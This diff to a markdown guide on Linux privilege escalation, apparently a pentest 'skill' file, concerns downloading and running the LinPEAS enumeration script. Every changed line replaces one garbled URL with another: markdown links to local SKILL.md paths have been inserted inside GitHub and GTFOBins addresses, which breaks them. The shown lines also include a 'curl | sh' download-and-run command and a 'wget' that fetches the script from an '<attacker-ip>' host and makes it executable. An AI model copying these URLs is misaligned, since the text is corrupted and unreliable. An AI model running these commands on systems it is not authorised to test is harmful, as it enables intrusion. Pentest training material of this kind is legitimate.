@@ -57,10 +57,10 @@ LinPEAS (Linux Privilege Escalation Awesome Script) is the most comprehensive au
 
 ```bash
 # Download and run LinPEAS directly (no-install, in-memory)
-curl -L https://[github](../../DevOps_and_Cloud/CI_CD/github/SKILL.md).com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+curl -L https://[github](../../ci-cd/github-actions/other/github/SKILL.md).com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
 
 # Save output for analysis
-curl -L https://[github](../../DevOps_and_Cloud/CI_CD/github/SKILL.md).com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh
+curl -L https://[github](../../ci-cd/github-actions/other/github/SKILL.md).com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh
 chmod +x /tmp/linpeas.sh
 /tmp/linpeas.sh -a 2>&1 | tee /tmp/linpeas_output.txt
 
@@ -133,7 +133,7 @@ See [../../../Global_References/privesc_vectors.md](../../../Global_References/p
 ```bash
 sudo -l
 # Look for: NOPASSWD entries, unrestricted shells, wildcard abuse
-# GTFOBins: https://gtfobins.[github](../../DevOps_and_Cloud/CI_CD/github/SKILL.md).io/
+# GTFOBins: https://gtfobins.[github](../../ci-cd/github-actions/other/github/SKILL.md).io/
 ```
 
 **SUID Binaries**
@@ -249,10 +249,10 @@ wget http://<attacker-ip>:8080/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh &
 
 ## References
 
-- [LinPEAS GitHub](https://[github](../../DevOps_and_Cloud/CI_CD/github/SKILL.md).com/peass-ng/PEASS-ng/tree/master/linPEAS)
+- [LinPEAS GitHub](https://[github](../../ci-cd/github-actions/other/github/SKILL.md).com/peass-ng/PEASS-ng/tree/master/linPEAS)
 - [HackTricks Linux Privesc](https://book.hacktricks.xyz/[linux-hardening](../../DevOps_and_Cloud/Observability_and_SecOps/linux-hardening/SKILL.md)/privilege-escalation)
-- [GTFOBins](https://gtfobins.[github](../../DevOps_and_Cloud/CI_CD/github/SKILL.md).io/)
+- [GTFOBins](https://gtfobins.[github](../../ci-cd/github-actions/other/github/SKILL.md).io/)
 - [MITRE ATT&CK TA0004 Privilege Escalation](https://attack.mitre.org/tactics/TA0004/)
 - [MITRE ATT&CK TA0007 Discovery](https://attack.mitre.org/tactics/TA0007/)
-- [PayloadsAllTheThings Linux Privesc](https://[github](../../DevOps_and_Cloud/CI_CD/github/SKILL.md).com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
+- [PayloadsAllTheThings Linux Privesc](https://[github](../../ci-cd/github-actions/other/github/SKILL.md).com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
 
